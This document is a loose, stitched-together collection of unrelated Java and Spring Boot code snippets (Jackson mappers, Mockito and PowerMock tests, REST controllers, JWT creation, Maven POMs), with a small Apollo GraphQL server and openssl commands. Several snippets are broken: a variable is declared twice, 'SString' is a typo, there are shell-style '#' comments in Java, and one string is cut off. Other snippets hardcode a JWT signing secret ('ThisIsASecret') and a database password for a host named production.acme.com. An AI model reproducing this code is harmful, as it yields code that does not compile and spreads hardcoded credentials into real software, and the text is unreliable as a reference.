-------------------------------------------------------------------------------------------------------
DateTimeSerializer serializer = context.mock(DateTimeSerializer.class);
DateTimeDeserializer serializer = context.mock(DateTimeDeserializer.class);
ObjectMapper mapper = JacksonMapperFactory.createObjectMapper(deserializer, serializer);

exactly(1).of(jsonDeserializer).serialize(myDateTime,
  with(any(JsonGenerator.class),
  with(any(SerializerProvider.class)))


-------------------------------------------------------------------------------------------------------
public class JsonMapperFactory {

    public static ObjectMapper configureObjectMapper(final ObjectMapper mapper, final SimpleModule module) {
        final SimpleModuleBuilder modulebuilder = new SimpleModuleBuilder();

        final SimpleModule configuredModule = modulebuilder.configure(module)
            .withSerializer(DateTime.class, new DateTimeSerializer())
            .withDeserializer(DateTime.class, new DateTimeDeserializer())
            .build();

        final ObjectMapperBuilder objectMapperBuilder = new ObjectMapperBuilder();
        return objectMapperBuilder.configure(mapper).withModule(configuredModule).build();
    }
}

public class SimpleModuleBuilder {
    SimpleModule module;

    public SimpleModuleBuilder configure(final SimpleModule module) {
        this.module = module;
        return this;
    }

    public <X> SimpleModuleBuilder withSerializer(final Class<X> clazz, final JsonSerializer<X> serializer) {
        this.module.addSerializer(clazz, serializer);
        return this;
    }

    public <X> SimpleModuleBuilder withDeserializer(final Class<X> clazz, final JsonDeserializer<X> deserializer) {
        this.module.addDeserializer(clazz, deserializer);
        return this;
    }

    public SimpleModule build() {
        return this.module;
    }
}

public class ObjectMapperBuilder {
    ObjectMapper mapper;

    public ObjectMapperBuilder configure(final ObjectMapper mapper) {
        this.mapper = mapper;
        return this;
    }

    public ObjectMapperBuilder withModule(final Module module) {
        this.mapper.registerModule(module);
        return this;
    }

    public ObjectMapper build() {
        return this.mapper;
    }
}
-------------------------------------------------------------------------------------------------------
const { ApolloServer, gql } = require('apollo-server');

const listings = [
  { id: "001", title: "Large ensuite
condo", city: "Toronto" },
  { id: "002", title: "Beverly Hills
Mansion", city: "Los Angeles" },
  { id: "003", title: "Small chic
bedroom", city: "Dubai" }
];

const typeDefs = gql` type Listing { id: String! title: String! city: String! }  type Query { listings: [Listing!]! } `;

const resolvers = {
  Query: {
    listings: () => listings,
  }
};

const server = new ApolloServer({ typeDefs, resolvers });

server.listen().then(({ url })
=> {
  console.log(`Server is running at ${url}`);
});
-------------------------------------------------------------------------------------------------------
{
  "serialNumber": "FDR6K9-4BPROP-9IJVM7-OLKU9B-CGP8NJ",
  "skUs": [
    "test-sku"
  ],
  "creationTime": "2019-10-17T15:18:58.3858135Z",
  "modificationTime": "2019-10-17T15:18:58.3858135Z",
  "expirationTime": "0001-01-01T00:00:00Z",
  "type": 0
}
-------------------------------------------------------------------------------------------------------
        // when
//        final JsonNode jsonNode = this.objectMapper.readTree(source);
//        final JsonParser parser = this.objectMapper.treeAsTokens(jsonNode);
//        final TestItem<String> actual = this.objectMapper.readValue(parser, new TypeReference<TestItem<String>>() {
//        });
-------------------------------------------------------------------------------------------------------
RestTemplateBuilder restTemplateBuilder = new RestTemplateBuilder();
restTemplateBuilder.configure(restTemplate);
TestRestTemplate testRestTemplate = new TestRestTemplate(restTemplateBuilder);
ResponseEntity<String> response = testRestTemplate.getForEntity(
  FOO_RESOURCE_URL + "/1", String.class);
  
assertThat(response.getStatusCode(), equalTo(HttpStatus.OK));
-------------------------------------------------------------------------------------------------------

8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = IntegrationTest.TestConfig.class)
@WebAppConfiguration
public class RestTest {
 
 
    private static final String APP_HEADER = "app-header";
    private static final String CLIENT_HEADER = "client-header";
 
    @Autowired
    private RestTemplate restTemplate;
 
    @Value("${eventApi.url}")
    private String eventApi;
 
    @Test
    public void testSendEventOk() {
 
        String bodyTesting = "test";
        HttpHeaders headers = setHeaders("appTest", "clientTest");
        HttpEntity<String> entity = new HttpEntity<String>(bodyTesting, headers);
        ResponseEntity<String> exchange = restTemplate.exchange(eventApi, HttpMethod.POST, entity, String.class);
        assertEquals(exchange.getStatusCode(), HttpStatus.CREATED);
 
    }
 
    private HttpHeaders setHeaders(String app, String clientId) {
        HttpHeaders headers = new HttpHeaders();
        headers.set(APP_HEADER, app);
        headers.set(CLIENT_HEADER, clientId);
        return headers;
    }
 
    @Configuration
    @EnableConfigurationProperties
    @ComponentScan
    @EnableAutoConfiguration
    static class TestConfig {
 
        @Bean
        public RestTemplate getRestTemplate() {
            return new TestRestTemplate();
        }
    }
}
-------------------------------------------------------------------------------------------------------
@Mock private MyClass.FactoryHelper mockFactoryHelper; 
@Mock private Foo mockFoo; 
private MyClass toTest; 
and you can use it like this

toTest = new MyClass( x, y, mockFactoryHelper ); 
when( mockFactoryHelper.makeFoo( 
    any( A.class ), any( B.class ), any( C.class )))
    .thenReturn( mockFoo ); 
-------------------------------------------------------------------------------------------------------
@Configuration
@EnableGlobalMethodSecurity(prePostEnabled = true, proxyTargetClass = true)
public class MethodSecurityConfig extends GlobalMethodSecurityConfiguration {

    @Override
    protected MethodSecurityExpressionHandler createExpressionHandler() {
        return new OAuth2MethodSecurityExpressionHandler();
    }

}
-------------------------------------------------------------------------------------------------------
Firstly, I created a new rsa 2048 bit private key with sha256 signed algorithm, using the command below
openssl req -x509 -newkey rsa:2048 -keyout mock-auth.key -out mock-auth.crt -days 3650 -sha256 -subj “/C=US/ST=Oregon/L=Portland/O=Company Name/OU=Org/CN=www.example.com" -nodes
Then, I created a certificate from this private key using the command below,
openssl req -key mock-auth.key -new -x509 -days 3650 -out mock-auth.crt -sha256 -subj “/C=US/ST=Oregon/L=Portland/O=Company Name/OU=Org/CN=www.example.com
-------------------------------------------------------------------------------------------------------
{"jti":"f6cafaed-449e-4d03-a1df-3fef1a4721d9","userid":"4d104eff-9127-4f5e-93b9-64df1d9a5c44","ownerid":"4d104eff-9127-4f5e-93b9-64df1d9a5c44","http://schemas.microsoft.com/ws/2008/06/identity/claims/role":"Admin","exp":1571333240,"iss":"Registry","aud":"Registry"}
-------------------------------------------------------------------------------------------------------
public class TokenAuthenticationService {

    static final long EXPIRATIONTIME = 864_000_000; // 10 days
    static final String SECRET = "ThisIsASecret";
    static final String TOKEN_PREFIX = "Bearer";
    static final String HEADER_STRING = "Authorization";

    public static void addAuthentication(HttpServletResponse res, String username) {

        String jwt = createToken(username);

        res.addHeader(HEADER_STRING, TOKEN_PREFIX + " " + jwt);
    }

    public static Authentication getAuthentication(HttpServletRequest request) {
        String token = request.getHeader(HEADER_STRING);
        if (token != null) {
            // parse the token.
            String user = Jwts.parser()
                    .setSigningKey(SECRET)
                    .parseClaimsJws(token.replace(TOKEN_PREFIX, ""))
                    .getBody()
                    .getSubject();

            return user != null ?
                    new UsernamePasswordAuthenticationToken(user, null, Collections.emptyList()) :
                        null;
        }
        return null;
    }

    public static String createToken(String username) {
        String jwt = Jwts.builder()
                .setSubject(username)
                .setExpiration(new Date(System.currentTimeMillis() + EXPIRATIONTIME))
                .signWith(SignatureAlgorithm.HS512, SECRET)
                .compact();

        return jwt;
    }
}

@RunWith(SpringRunner.class)
@SpringBootTest
@AutoConfigureMockMvc
public class TokenAuthenticationServiceTest {

    @Autowired
    private MockMvc mvc;

    @Test
    public void shouldNotAllowAccessToUnauthenticatedUsers() throws Exception {
        mvc.perform(MockMvcRequestBuilders.get("/test")).andExpect(status().isForbidden());
    }

    @Test
    public void shouldGenerateAuthToken() throws Exception {
        String token = TokenAuthenticationService.createToken("john");

        assertNotNull(token);
        mvc.perform(MockMvcRequestBuilders.get("/test").header("Authorization", token)).andExpect(status().isOk());
    }

}
-------------------------------------------------------------------------------------------------------
LoggingFailureAnalysisReporter   
-------------------------------------------------------------------------------------------------------
    @Bean
    ModelMapper modelMapper() {
        ModelMapper mapper = new ModelMapper();

        Configuration configuration = mapper.getConfiguration();
        configuration.setMatchingStrategy(MatchingStrategies.STRICT);
        configuration.setFieldAccessLevel(Configuration.AccessLevel.PUBLIC);
        configuration.setMethodAccessLevel(Configuration.AccessLevel.PUBLIC);
        configuration.setAmbiguityIgnored(false);
        configuration.setDestinationNamingConvention(NamingConventions.JAVABEANS_MUTATOR);
        configuration.setSourceNamingConvention(NamingConventions.JAVABEANS_ACCESSOR);

        return mapper;
    }
-------------------------------------------------------------------------------------------------------
@SpringBootApplication
public class GreetingApplication {

    public static void main(String[] args) throws Exception {
        GreetingApplication application = new GreetingApplication();

        application.run(args);
    }

    public void run(String[] args) {
        SpringApplication.run(GreetingApplication.class, args);
    }

    @Bean
    DataSource productionDataSource() {
        PGSimpleDataSource dataSource = new PGSimpleDataSource();
        dataSource.setServerName("production.acme.com");
        dataSource.setPortNumber(5432);
        dataSource.setDatabaseName("postgres");
        dataSource.setUser("postgres");
        dataSource.setPassword("mysecretpassword");

        return dataSource;
    }

    @Bean
    LocalContainerEntityManagerFactoryBean entityManagerFactory(
            EntityManagerFactoryBuilder builder, DataSource dataSource) {
        Map<String, Object> properties = new HashMap<>();
        properties.put(DATASOURCE, dataSource);

        return builder.dataSource(dataSource)
                .persistenceUnit("example.greeter")
                .properties(properties)
                .build();
    }

    @Bean
    ModelMapper modelMapper() {
        ModelMapper mapper = new ModelMapper();

        Configuration configuration = mapper.getConfiguration();
        configuration.setMatchingStrategy(MatchingStrategies.STRICT);
        configuration.setFieldAccessLevel(Configuration.AccessLevel.PUBLIC);
        configuration.setMethodAccessLevel(Configuration.AccessLevel.PUBLIC);
        configuration.setAmbiguityIgnored(false);
        configuration.setDestinationNamingConvention(NamingConventions.JAVABEANS_MUTATOR);
        configuration.setSourceNamingConvention(NamingConventions.JAVABEANS_ACCESSOR);

        return mapper;
    }
}
-------------------------------------------------------------------------------------------------------
//final Resource resource = new ClassPathResource("ludwig.json", this.getClass());
-------------------------------------------------------------------------------------------------------
public class LocatorService {

	public Point generatePointWithinDistance(Point point, int distance) {
		return new Point(point.getX() + Utils.randomDistance(distance), 
			point.getY() + Utils.randomDistance(distance));
	}
}
-------------------------------------------------------------------------------------------------------
<dependency>
	<groupId>org.powermock</groupId>
	<artifactId>powermock-module-junit4</artifactId>
	<version>1.6.5</version>
	<scope>test</scope>
</dependency>
<dependency>
	<groupId>org.powermock</groupId>
	<artifactId>powermock-api-mockito</artifactId>
	<version>1.6.5</version>
	<scope>test</scope>
</dependency>
-------------------------------------------------------------------------------------------------------
package com.journaldev.mockito.staticmethod;

import static org.testng.Assert.assertFalse;
import static org.testng.Assert.assertTrue;

import static org.mockito.Mockito.*;
import org.powermock.api.mockito.PowerMockito;
import org.powermock.core.classloader.annotations.PrepareForTest;
import org.powermock.modules.testng.PowerMockTestCase;
import org.testng.annotations.Test;

@PrepareForTest(Utils.class)
public class TestNGPowerMockitoStaticTest extends PowerMockTestCase{

	@Test
	public void test_static_mock_methods() {
		PowerMockito.mockStatic(Utils.class);
		when(Utils.print("Hello")).thenReturn(true);
		when(Utils.print("Wrong Message")).thenReturn(false);
		
		assertTrue(Utils.print("Hello"));
		assertFalse(Utils.print("Wrong Message"));
		
		PowerMockito.verifyStatic(Utils.class);
		Utils.print("Hello");
		PowerMockito.verifyStatic(Utils.class, times(2));
		Utils.print(anyString());
	}
}

package com.journaldev.mockito.staticmethod;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.atLeast;
import static org.mockito.Mockito.when;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.powermock.api.mockito.PowerMockito;
import org.powermock.core.classloader.annotations.PrepareForTest;
import org.powermock.modules.junit4.PowerMockRunner;

@RunWith(PowerMockRunner.class)
@PrepareForTest(Utils.class)
public class JUnit4PowerMockitoStaticTest{

	@Test
	public void test_static_mock_methods() {
		PowerMockito.mockStatic(Utils.class);
		when(Utils.print("Hello")).thenReturn(true);
		when(Utils.print("Wrong Message")).thenReturn(false);
		
		assertTrue(Utils.print("Hello"));
		assertFalse(Utils.print("Wrong Message"));
		
		PowerMockito.verifyStatic(Utils.class, atLeast(2));
		Utils.print(anyString());
	}
}
-------------------------------------------------------------------------------------------------------
<project xmlns="http://maven.apache.org/POM/4.0.0"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<groupId>com.journaldev.powermock</groupId>
	<artifactId>PowerMock-Examples</artifactId>
	<version>0.0.1-SNAPSHOT</version>

	<properties>
		<testng.version>6.14.3</testng.version>
		<junit4.version>4.12</junit4.version>
		<mockito-core.version>2.19.0</mockito-core.version>
		<powermock.version>2.0.0-beta.5</powermock.version>
		<java.version>10</java.version>
	</properties>

	<dependencies>
		<!-- TestNG -->
		<dependency>
			<groupId>org.testng</groupId>
			<artifactId>testng</artifactId>
			<version>${testng.version}</version>
			<scope>test</scope>
		</dependency>
		<!-- JUnit 4 -->
		<dependency>
			<groupId>junit</groupId>
			<artifactId>junit</artifactId>
			<version>${junit4.version}</version>
			<scope>test</scope>
		</dependency>
		<!-- Mockito 2 -->
		<dependency>
			<groupId>org.mockito</groupId>
			<artifactId>mockito-core</artifactId>
			<version>${mockito-core.version}</version>
			<scope>test</scope>
		</dependency>
		<!-- PowerMock TestNG Module -->
		<dependency>
			<groupId>org.powermock</groupId>
			<artifactId>powermock-module-testng</artifactId>
			<version>${powermock.version}</version>
			<scope>test</scope>
		</dependency>
		<!-- PowerMock JUnit 4.4+ Module -->
		<dependency>
			<groupId>org.powermock</groupId>
			<artifactId>powermock-module-junit4</artifactId>
			<version>${powermock.version}</version>
			<scope>test</scope>
		</dependency>
		<!-- PowerMock Mockito2 API -->
		<dependency>
			<groupId>org.powermock</groupId>
			<artifactId>powermock-api-mockito2</artifactId>
			<version>${powermock.version}</version>
			<scope>test</scope>
		</dependency>
	</dependencies>
	<build>
		<plugins>
			<plugin>
				<artifactId>maven-compiler-plugin</artifactId>
				<version>3.7.0</version>
				<configuration>
					<source>${java.version}</source>
					<target>${java.version}</target>
				</configuration>
			</plugin>
			<plugin>
				<groupId>org.apache.maven.plugins</groupId>
				<artifactId>maven-surefire-plugin</artifactId>
				<version>2.22.0</version>
				<dependencies>
					<dependency>
						<groupId>org.apache.maven.surefire</groupId>
						<artifactId>surefire-junit47</artifactId>
						<version>2.22.0</version>
					</dependency>
					<dependency>
						<groupId>org.apache.maven.surefire</groupId>
						<artifactId>surefire-testng</artifactId>
						<version>2.22.0</version>
					</dependency>
				</dependencies>
				<configuration>
					<additionalClasspathElements>
						<additionalClasspathElement>src/test/java/</additionalClasspathElement>
					</additionalClasspathElements>
					<!-- TestNG Test Fails when executed from command line with message
						"Cannot use a threadCount parameter less than 1" 
						Works when threadCount is explicitly specified 
						https://gist.github.com/juherr/6eb3e93e2db33979b7e90b63ddadc888-->
					<threadCount>5</threadCount>
				</configuration>
			</plugin>
		</plugins>
	</build>
</project>
-------------------------------------------------------------------------------------------------------
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.Controller;
public class MainController implements Controller {
    @Override
    public ModelAndView handleRequest(HttpServletRequest request,
            HttpServletResponse response) throws Exception {
        System.out.println("Welcome main");
        return new ModelAndView("main");
    }
}
-------------------------------------------------------------------------------------------------------
create unique index ux_test on my_table (case when amount != 0 then fk_xyz end);
-------------------------------------------------------------------------------------------------------
JAVA_TOOL_OPTIONS: -javaagent:/usr/share/java/jayatanaag.jar 
-------------------------------------------------------------------------------------------------------
<dependency>
    <groupId>com.xebialabs.restito</groupId>
    <artifactId>restito</artifactId>
    <version>0.9.3</version>
</dependency>

gradle clean build
-------------------------------------------------------------------------------------------------------
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-jasper</artifactId>
    <scope>provided</scope>
</dependency>
<dependency>
    <groupId>javax.servlet</groupId>
    <artifactId>jstl</artifactId>
</dependency>
-------------------------------------------------------------------------------------------------------
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import javax.servlet.http.HttpServletRequest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.multipart.MultipartFile;
 
import com.adminportal.domain.Book;
import com.adminportal.service.BookService;
 
@Controller
@RequestMapping("/book")
public class BookController {
 
    @Autowired
    private BookService bookService;
 
    @RequestMapping(value = "/add", method = RequestMethod.GET)
    public String addBook(Model model) {
        Book book = new Book();
        model.addAttribute("book", book);
        return "addBook";
    }
 
    @RequestMapping(value = "/add", method = RequestMethod.POST)
    public String addBookPost(@ModelAttribute("book") Book book, HttpServletRequest request) {
        bookService.save(book);
 
        MultipartFile bookImage = book.getBookImage();
 
        try {
            byte[] bytes = bookImage.getBytes();
            String name = book.getId() + ".png";
            BufferedOutputStream stream = new BufferedOutputStream(
                    new FileOutputStream(new File("src/main/resources/static/image/book/" + name)));
            stream.write(bytes);
            stream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
 
        return "redirect: /bookList";
    }
     
     
 
}
-------------------------------------------------------------------------------------------------------
@SpringBootTest
@RunWith(SpringRunner.class)
@AutoConfigureMockMvc
public class UserResourceTests {
 
    @Autowired
    private MockMvc mockMvc;
 
    @SpyBean
    private MongoTemplate mongoTemplate;
 
    @Test
    public void should_create_a_user() throws Exception {
        String json = "{\"username\":\"shekhargulati\",\"name\":\"Shekhar Gulati\"}";
        doReturn(null)
                .when(mongoTemplate).findOne(Mockito.any(Query.class), Mockito.eq(User.class));
        doNothing().when(mongoTemplate).save(Mockito.any(User.class));
        this.mockMvc
                .perform(post("/api/users").contentType(MediaType.APPLICATION_JSON).content(json))
                .andDo(print())
                .andExpect(status().isCreated());
        verify(mongoTemplate).save(Mockito.any(User.class));
    }
}
-------------------------------------------------------------------------------------------------------
public class ToBeTested{

    public void myMethodToTest(){
         ...
         String s = makeStaticWrappedCall();
         ...
    }

    String makeStaticWrappedCall(){
        return Util.staticMethodCall();
    }
}
public class ToBeTestedTest{

    @Spy
    ToBeTested tbTestedSpy = new ToBeTested();

    @Before
    public void init(){
        MockitoAnnotations.initMocks(this);
    }

    @Test
    public void myMethodToTestTest() throws Exception{
       // Arrange
       doReturn("Expected String").when(tbTestedSpy).makeStaticWrappedCall();

       // Act
       tbTestedSpy.myMethodToTest();
    }
}
-------------------------------------------------------------------------------------------------------
StepVerifier.withVirtualTime(() -> Mono.delay(Duration.ofHours(3)))
            .expectSubscription()
            .expectNoEvent(Duration.ofHours(2))
            .thenAwait(Duration.ofHours(1))
            .expectNextCount(1)
            .expectComplete()
            .verify();
-------------------------------------------------------------------------------------------------------
//generic imports to help with simpler IDEs (ie tech.io)
import java.util.*;
import java.util.function.*;
import java.time.*;
import reactor.test.StepVerifier;

import io.pivotal.literx.domain.User;
import reactor.core.publisher.Flux;

import static org.assertj.core.api.Assertions.*;

/**
 * Learn how to use StepVerifier to test Mono, Flux or any other kind of Reactive Streams Publisher.
 *
 * @author Sebastien Deleuze
 * @see <a href="https://projectreactor.io/docs/test/release/api/reactor/test/StepVerifier.html">StepVerifier Javadoc</a>
 */
public class Part03StepVerifier {

//========================================================================================

	// TODO Use StepVerifier to check that the flux parameter emits "foo" and "bar" elements then completes successfully.
	void expectFooBarComplete(Flux<String> flux) {
		fail();
	}

//========================================================================================

	// TODO Use StepVerifier to check that the flux parameter emits "foo" and "bar" elements then a RuntimeException error.
	void expectFooBarError(Flux<String> flux) {
		fail();
	}

//========================================================================================

	// TODO Use StepVerifier to check that the flux parameter emits a User with "swhite"username
	// and another one with "jpinkman" then completes successfully.
	void expectSkylerJesseComplete(Flux<User> flux) {
		fail();
	}

//========================================================================================

	// TODO Expect 10 elements then complete and notice how long the test takes.
	void expect10Elements(Flux<Long> flux) {
		fail();
	}

//========================================================================================

	// TODO Expect 3600 elements at intervals of 1 second, and verify quicker than 3600s
	// by manipulating virtual time thanks to StepVerifier#withVirtualTime, notice how long the test takes
	void expect3600Elements(Supplier<Flux<Long>> supplier) {
		fail();
	}

	private void fail() {
		throw new AssertionError("workshop not implemented");
	}

}
-------------------------------------------------------------------------------------------------------
JwtClaims claims = new JwtClaims();
claims.setIssuer("issuer");
claims.setExpirationTimeMinutesInTheFuture(10);
claims.setGeneratedJwtId();
claims.setIssuedAtToNow();
claims.setNotBeforeMinutesInThePast(2);
claims.setSubject("subject");
#Create a HashMap called claimsMap to set any custom claims
#claimsMap.forEach(claims::setClaim);
String payload = claims.toJson();

JsonWebSignature jws = new JsonWebSignature();
jws.setPayload(payload);
jws.setKey(privateKey);
jws.setAlgorithmHeaderValue(AlgorithmIdentifiers.RSA_USING_SHA256);SString token = jws.getCompactSerialization();
-------------------------------------------------------------------------------------------------------
testRestTemplate.getRestTemplate().setInterceptors(
        Collections.singletonList((request, body, execution) -> {
            request.getHeaders()
                    .add("header-name", "value");
            return execution.execute(request, body);
        }));
		
 import org.apache.http.Header;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClients;
 import org.apache.http.message.BasicHeader;
 import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;


 private void setTestRestTemplateHeaders() {
    Header header = new BasicHeader("header", "value");
    Header header2 = new BasicHeader("header2", "value2");
    List<Header> headers = new ArrayList<Header>();
    headers.add(header);
    headers.add(header2);
    CloseableHttpClient httpClient = HttpClients.custom().setDefaultHeaders(headers).build();
    testRestTemplate.getRestTemplate().setRequestFactory(new HttpComponentsClientHttpRequestFactory(httpClient));
 }
-------------------------------------------------------------------------------------------------------
import java.net.URI;
 
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.support.ServletUriComponentsBuilder;
 
import com.howtodoinjava.rest.dao.EmployeeDAO;
import com.howtodoinjava.rest.model.Employee;
import com.howtodoinjava.rest.model.Employees;
 
@RestController
@RequestMapping(path = "/employees")
public class EmployeeController
{
    @Autowired
    private EmployeeDAO employeeDao;
      
    @PostMapping(path= "/", consumes = "application/json", produces = "application/json")
    public ResponseEntity<Object> addEmployee(
                        @RequestHeader(name = "X-COM-PERSIST", required = true) String headerPersist,
                        @RequestHeader(name = "X-COM-LOCATION", required = false, defaultValue = "ASIA") String headerLocation,
                        @RequestBody Employee employee)
                 throws Exception
    {      
        //Generate resource id
        Integer id = employeeDao.getAllEmployees().getEmployeeList().size() + 1;
        employee.setId(id);
         
        //add resource
        employeeDao.addEmployee(employee);
         
        //Create resource location
        URI location = ServletUriComponentsBuilder.fromCurrentRequest()
                                    .path("/{id}")
                                    .buildAndExpand(employee.getId())
                                    .toUri();
         
        //Send location in response
        return ResponseEntity.created(location).build();
    }
}
-------------------------------------------------------------------------------------------------------
@JsonComponent
public class UserJsonSerializer extends JsonSerializer<User> {
 
    @Override
    public void serialize(User user, JsonGenerator jsonGenerator, 
      SerializerProvider serializerProvider) throws IOException, 
      JsonProcessingException {
  
        jsonGenerator.writeStartObject();
        jsonGenerator.writeStringField(
          "favoriteColor", 
          getColorAsWebColor(user.getFavoriteColor()));
        jsonGenerator.writeEndObject();
    }
 
    private static String getColorAsWebColor(Color color) {
        int r = (int) Math.round(color.getRed() * 255.0);
        int g = (int) Math.round(color.getGreen() * 255.0);
        int b = (int) Math.round(color.getBlue() * 255.0);
        return String.format("#%02x%02x%02x", r, g, b);
    }
}
-------------------------------------------------------------------------------------------------------
[...]
@Constraint(validatedBy={
    SizeValidatorForCollection.class,
    SizeValidatorForSet.class,
    SizeValidatorForSerializable.class })
public @interface Size { [...] }

public class SizeValidatorForCollection implements ConstraintValidator<Size, Collection> {
    [...]
}
public class SizeValidatorForSet implements ConstraintValidator<Size, Set> {
    [...]
}
public class SizeValidatorForSerializable implements ConstraintValidator<Size, Serializable> {
    [...]
}

public interface SerializableCollection extends Serializable, Collection {
}
-------------------------------------------------------------------------------------------------------

@CrossOrigin(maxAge = 3600)
@RestController
@RequestMapping("/account")
public class AccountController {
    @CrossOrigin(origins = "http://example.com")
    @RequestMapping("/message")
    public Message getMessage() {
        // ...
    }
    @RequestMapping("/note")
    public Note getNote() {
        // ...
    }
}

@ModelAttribute("person")
public Person getPerson() {}
// within the same controller as above snippet
@Controller
@SeesionAttributes(value = "person", types = {
    Person.class
})
public class PersonController {}


@Repeat(10)
@Test
public void testProcessRepeatedly() {  ... }


@Timed(millis=10000)
public void testLongRunningProcess() {  ... }


import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.autoconfigure.domain.EntityScan;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
@EnableAutoConfiguration
@EnableJpaAuditing
@EnableJpaRepositories(basePackages = {"com.BusinessEntityManagementSystem"})
@EntityScan(basePackages = {"com.BusinessEntityManagementSystem"})
@ComponentScan(basePackages = {"com.BusinessEntityManagementSystem"})
@Configuration
public class BusinessEntityManagementApplication {
    public static void main(String[] args) {
        SpringApplication.run(BusinessEntityManagementApplication.class, args);
    }
}

import com.fasterxml.jackson.annotation.JsonIgnoreProperties;
import com.BusinessEntityManagementSystem.interfaces.models.IBusinessEntityModel;
import org.hibernate.annotations.OnDelete;
import org.hibernate.annotations.OnDeleteAction;
import javax.persistence.*;
import javax.validation.constraints.NotNull;
import javax.validation.constraints.Size;
import java.io.Serializable;
import java.util.HashSet;
import java.util.Set;
@Entity
@Table(name="BEMS_BusinessEntity")
@JsonIgnoreProperties({"hibernateLazyInitializer", "handler"})
public class BusinessEntityModel<IAddressModel extends AddressModel, IPartnerModel extends PartnerModel, IStoreModel extends StoreModel, IAffiliatedCompanyModel extends AffiliatedCompanyModel, IEconomicActivityCodeModel extends EconomicActivityCodeModel> extends AuditModel<String> implements IBusinessEntityModel, Serializable {
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    @NotNull
    @Column(name = "ID_BusinessEntity", updatable = false, nullable = false)
    private long id;
...
@OverrideAutoConfiguration(enabled=true)

/**
 * Annotation that can be used to override
 * {@link EnableAutoConfiguration @EnableAutoConfiguration}. Often used in combination
 * with {@link ImportAutoConfiguration} to limit the auto-configuration classes that are
 * loaded.
 *
 * @author Phillip Webb
 * @since 1.4.0
 * @see EnableAutoConfiguration#ENABLED_OVERRIDE_PROPERTY
 */
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface OverrideAutoConfiguration {

	/**
	 * The value of the {@link EnableAutoConfiguration#ENABLED_OVERRIDE_PROPERTY enabled
	 * override property}.
	 * @return the override value
	 */
	boolean enabled();

}

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT, properties="spring.

spring.datasource.initialize=false
JAVA_OPTS="-Dspring.profiles.active=production"
-------------------------------------------------------------------------------------------------------
//    /**
//     * Get specification {@link Specification} of user accounts to be expired
//     * before the requested date
//     *
//     * @param expiredAt - requested expiration date
//     * @return user account specification {@link Specification}
//     * @param <T>
//     */
//    public static <T extends UserAccount> Specification<T> accountExpiresBefore(final Date expiredAt) {
//
//        return (final Root<T> root, final CriteriaQuery<?> query, final CriteriaBuilder cb) -> {
//            Root<UserAccount> accounts = query.from(UserAccount.class);
//            Path<Date> expiryDate = accounts.<Date>get("expiredAt");
//            Predicate customerIsAccountOwner = cb.equal(accounts.<T>get("user"), root);
//            Predicate accountExpiryDateBefore = cb.lessThan(expiryDate, expiredAt);
//            return cb.and(customerIsAccountOwner, accountExpiryDateBefore);
//        };
//    }
-------------------------------------------------------------------------------------------------------
public class EnvironmentPostProcessorExample implements EnvironmentPostProcessor {

    private final YamlPropertySourceLoader loader = new YamlPropertySourceLoader();

    @Override
    public void postProcessEnvironment(ConfigurableEnvironment environment, SpringApplication application) {
        Resource path = new ClassPathResource("com/example/myapp/config.yml");
        PropertySource<?> propertySource = loadYaml(path);
        environment.getPropertySources().addLast(propertySource);
    }

    private PropertySource<?> loadYaml(Resource path) {
        if (!path.exists()) {
            throw new IllegalArgumentException("Resource " + path + " does not exist");
        }
        try {
            return this.loader.load("custom-resource", path).get(0);
        }
        catch (IOException ex) {
            throw new IllegalStateException("Failed to load yaml configuration from " + path, ex);
        }
    }
}
-------------------------------------------------------------------------------------------------------
new SpringApplicationBuilder()
    .bannerMode(Banner.Mode.OFF)
    .sources(demo.MyApp.class)
    .run(args);
-------------------------------------------------------------------------------------------------------
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-resources-plugin</artifactId>
    <version>2.7</version>
    <configuration>
        <delimiters>
            <delimiter>@</delimiter>
        </delimiters>
        <useDefaultDelimiters>false</useDefaultDelimiters>
    </configuration>
</plugin>
-------------------------------------------------------------------------------------------------------
//@Entity(name = "Order")
//@Table(name = "orders", uniqueConstraints = {
//    @UniqueConstraint(columnNames = "uuid", name = "uuid_unique_constraint")
//})
//@Inheritance(strategy = InheritanceType.JOINED)
//@SuppressWarnings({"ValidPrimaryTableName", "UniqueEntityName"})
//@Indexed
//@Analyzer(impl = org.apache.lucene.analysis.standard.StandardAnalyzer.class)
